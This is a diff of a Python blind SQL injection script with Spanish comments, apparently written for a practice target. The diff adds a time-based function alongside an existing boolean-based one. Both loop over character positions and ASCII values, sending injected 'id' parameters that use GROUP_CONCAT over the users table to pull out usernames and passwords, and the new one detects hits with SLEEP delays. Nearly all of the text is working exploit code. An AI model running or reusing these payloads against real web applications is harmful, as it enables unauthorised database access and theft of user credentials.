@@ -35,15 +35,38 @@ def makeSQLI():
             #sqli_url=URL+"?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1)=%d)" % (position,character)
             #Enumerar usuarios y contraseñas
             sqli_url=URL+"?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1)=%d)" % (position,character)
+                
             p1.status(sqli_url)
             r=requests.get(sqli_url)
             if r.status_code== 200:
                 extracted_info+=(chr(character))
                 p2.status(extracted_info)
                 break
-        
+            
+def makeSQLITime():
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+    time.sleep(2)
+    p2 = log.progress("Datos extraidos")
+    extracted_info=""
+    #Se contempla 100 posiciones ya que no se sabe cuantos caracteres tiene la data en la BD
+    for position in range (1,100):
+        #Se contempla del 33 al 122 ya que son el equivalente en ASCII de los caracteres que se pueden usar en una contraseña
+        #Validar con man ascii en linux
+        for character in range (33,126):
+            #Enumerar basado en tiempos
+            sqli_url=URL+"?id=1 AND IF(ASCII(SUBSTR((SELECT GROUP_CONCAT(username,0x3a,password) FROM users),%d,1))=%d,SLEEP(0.35),1)" % (position,character)
+            time_start = time.time()
+            p1.status(sqli_url)
+            r=requests.get(sqli_url)
+            time_end=time.time()
+            if time_end - time_start >0.35:
+                extracted_info+=chr(character)
+                p2.status(extracted_info)
+                break
 
 if __name__== '__main__':
     
     makeSQLI()
+    makeSQLITime()
     
